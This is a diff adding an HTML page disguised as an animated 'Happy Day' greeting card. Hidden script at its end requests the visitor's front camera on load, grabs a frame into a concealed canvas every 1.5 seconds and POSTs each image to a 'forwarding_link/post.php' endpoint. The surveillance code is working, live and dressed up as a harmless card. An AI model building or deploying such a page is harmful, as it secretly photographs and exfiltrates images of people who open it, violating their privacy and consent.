@@ -1,0 +1,387 @@
+<html>
+<head>
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+<meta content="width=device-width,height=device-height,inital-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
+<div class="greeting_card">
+	<div class="back">
+	</div>
+	<div class="front">
+		<div class="textWrapper">
+			<h1>Happy Day</h1>
+			<h2>Good Morning</h2>
+		</div>
+		<div class="firework">
+			<div class="circle circle1"></div>
+			<div class="circle circle2"></div>
+			<div class="circle circle3"></div>
+			<div class="circle circle4"></div>
+			<div class="circle circle5"></div>
+		</div>
+		<div class="firework firework2">
+			<div class="circle circle1"></div>
+			<div class="circle circle2"></div>
+			<div class="circle circle3"></div>
+			<div class="circle circle4"></div>
+			<div class="circle circle5"></div>
+		</div>
+		<div class="firework firework3">
+			<div class="circle circle1"></div>
+			<div class="circle circle2"></div>
+			<div class="circle circle3"></div>
+			<div class="circle circle4"></div>
+			<div class="circle circle5"></div>
+		</div>
+		<div class="firework firework4">
+			<div class="circle circle1"></div>
+			<div class="circle circle2"></div>
+			<div class="circle circle3"></div>
+			<div class="circle circle4"></div>
+			<div class="circle circle5"></div>
+		</div>
+		<div class="dots dot1"></div>
+		<div class="dots dot2"></div>
+		<div class="dots dot3"></div>
+		<div class="dots dot4"></div>
+		<div class="dots dot5"></div>
+		<div class="dots dot6"></div>
+		<div class="dots dot7"></div>
+		<div class="dots dot8"></div>
+	</div>
+	<div class="content">
+		<h1>Best wishes!</h1>
+		<div class="dots dot1"></div>
+		<div class="dots dot2"></div>
+		<div class="dots dot3"></div>
+		<div class="dots dot4"></div>
+		<div class="dots dot5"></div>
+		<div class="dots dot6"></div>
+		<div class="dots dot7"></div>
+		<div class="dots dot8"></div>
+		<div class="dots dot9"></div>
+		<div class="dots dot10"></div>
+	</div>
+</div>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Oswald:600');
+ * {
+	 box-sizing: border-box;
+}
+ body {
+	 margin: 0;
+}
+ .greeting_card {
+	 width: 300px;
+	 height: 450px;
+	 background-color: #111426;
+	 color: white;
+	 position: relative;
+	 margin: 150px auto;
+	 box-shadow: 4px 7px 18px -2px rgba(0, 0, 0, 0.75);
+}
+ .greeting_card .front {
+	 height: 100%;
+	 width: 100%;
+	 position: absolute;
+	 background-color: #111426;
+	 transition: all 1s ease-in-out;
+	 transform-origin: center left;
+	 transform: perspective(700) rotateY(0);
+	 z-index: 2;
+	 border: 10px solid black;
+	 display: flex;
+	 align-items: center;
+	 justify-content: center;
+	 text-align: center;
+	 transform-style: preserve-3d;
+}
+ .greeting_card .front .textWrapper {
+	 font-family: 'Oswald', sans-serif;
+	 background-color: rgba(17, 20, 38, 0.5);
+	 width: 100%;
+	 z-index: 1;
+	 position: relative;
+	 top: -20px;
+	 opacity: 1;
+	 overflow: hidden;
+	 transition: all 0.5s;
+	 transition-timing-function: cubic-bezier(0, 0.15, 1, -2.7);
+}
+ .greeting_card .front .textWrapper h1 {
+	 font-size: 80px;
+	 margin: 0;
+}
+ .greeting_card .front .textWrapper h2 {
+	 font-size: 20px;
+	 margin: 0;
+}
+ .greeting_card .front .firework {
+	 width: 150px;
+	 height: 150px;
+	 position: absolute;
+	 border: 5px dotted #f00;
+	 border-radius: 100%;
+	 top: 40px;
+	 left: 20px;
+	 display: flex;
+	 align-items: center;
+	 justify-content: center;
+	 animation: firework 1.5s ease-in-out infinite;
+	 transition-timing-function: cubic-bezier(0, 0.15, 1, -2.7);
+}
+ .greeting_card .front .firework .circle {
+	 width: 90%;
+	 height: 90%;
+	 border-radius: 100%;
+	 border: 5px dotted #0dc200;
+	 position: absolute;
+}
+ .greeting_card .front .firework .circle2 {
+	 width: 70%;
+	 height: 70%;
+	 border-radius: 100%;
+	 border-color: #fff719;
+}
+ .greeting_card .front .firework .circle3 {
+	 width: 50%;
+	 height: 50%;
+	 border-radius: 100%;
+	 border-color: #f00;
+}
+ .greeting_card .front .firework .circle4 {
+	 width: 30%;
+	 height: 30%;
+	 border-radius: 100%;
+	 border-color: #0dc200;
+}
+ .greeting_card .front .firework .circle5 {
+	 width: 15%;
+	 height: 15%;
+	 border-radius: 100%;
+	 border-color: #f00;
+}
+ .greeting_card .front .firework2 {
+	 width: 110px;
+	 height: 110px;
+	 left: 140px;
+	 top: 100px;
+	 animation-delay: 1s;
+}
+ .greeting_card .front .firework3 {
+	 width: 80px;
+	 height: 80px;
+	 left: 30px;
+	 top: 180px;
+	 animation-delay: 0.2s;
+}
+ .greeting_card .front .firework4 {
+	 width: 120px;
+	 height: 120px;
+	 left: 100px;
+	 top: 180px;
+	 animation-delay: 0.8s;
+}
+ .greeting_card .back {
+	 width: 100%;
+	 height: 100%;
+	 position: absolute;
+	 transition: all 1s ease-in-out;
+	 transform: perspective(700) rotateY(0);
+	 transform-origin: center left;
+}
+ .greeting_card .content {
+	 width: 100%;
+	 height: 100%;
+	 background-color: #111426;
+	 color: white;
+	 position: absolute;
+	 text-align: center;
+	 border: 10px solid black;
+	 display: flex;
+	 align-items: center;
+	 justify-content: center;
+}
+ .greeting_card .content h1 {
+	 background-color: rgba(0, 0, 0, 0.5);
+	 padding: 20px 40px;
+	 font-family: 'Oswald', sans-serif;
+	 z-index: 1;
+}
+ .greeting_card .content .dot4 {
+	 top: 300px;
+	 left: 100px;
+}
+ .greeting_card .content .dot8 {
+	 left: 240px;
+}
+ .greeting_card .content .dot9 {
+	 top: 100px;
+	 left: 90px;
+	 background-color: white;
+}
+ .greeting_card .content .dot10 {
+	 top: 400px;
+	 left: 230px;
+	 background-color: white;
+}
+ .greeting_card:hover .front {
+	 transform: perspective(700) rotateY(-160deg);
+}
+ .greeting_card:hover .front .textWrapper {
+	 opacity: 0;
+	 transition: all 0.6s ease-in-out;
+}
+ .greeting_card:hover .back {
+	 transform: perspective(700) rotateY(-160deg);
+	 box-shadow: 5px 0px 20px rgba(0, 0, 0, 1);
+}
+ @keyframes firework {
+	 from {
+		 transform: scale(0);
+		 opacity: 1;
+	}
+	 to {
+		 transform: scale(1);
+		 opacity: 0;
+	}
+}
+ @keyframes dots {
+	 0% {
+		 opacity: 1;
+	}
+	 50% {
+		 opacity: 0.2;
+	}
+}
+ .greeting_card .front .dots, .content .dots {
+	 width: 10px;
+	 height: 10px;
+	 border-radius: 100%;
+	 background-color: #0dc200;
+	 position: absolute;
+	 top: 0;
+	 transition: all 2.7s ease-in-out;
+	 box-shadow: 0 0 15px yellow;
+}
+ .greeting_card .front .dots:nth-child(even), .content .dots:nth-child(even) {
+	 animation: dots 3s ease-in-out infinite;
+}
+ .greeting_card .front .dots:nth-child(odd), .content .dots:nth-child(odd) {
+	 animation: dots 2s ease-in-out infinite;
+	 animation-delay: 0.2s;
+}
+ .greeting_card .front .dot2, .content .dot2 {
+	 top: 50px;
+	 left: 200px;
+	 background-color: #f00;
+}
+ .greeting_card .front .dot3, .content .dot3 {
+	 top: 350px;
+	 left: 200px;
+	 background-color: #5f0e95;
+}
+ .greeting_card .front .dot4, .content .dot4 {
+	 top: 320px;
+	 left: 150px;
+	 background-color: #fff719;
+}
+ .greeting_card .front .dot5, .content .dot5 {
+	 top: 350px;
+	 left: 10px;
+	 background-color: #f00;
+}
+ .greeting_card .front .dot6, .content .dot6 {
+	 top: 390px;
+	 left: 100px;
+	 background-color: #0dc200;
+}
+ .greeting_card .front .dot7, .content .dot7 {
+	 top: 150px;
+	 left: 10px;
+	 background-color: #fff719;
+}
+ .greeting_card .front .dot8, .content .dot8 {
+	 top: 200px;
+	 left: 250px;
+	 background-color: #f00;
+}
+ .warning {
+	 color: red;
+	 text-align: center;
+	 margin-top: -100px;
+}
+ 
+</style>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
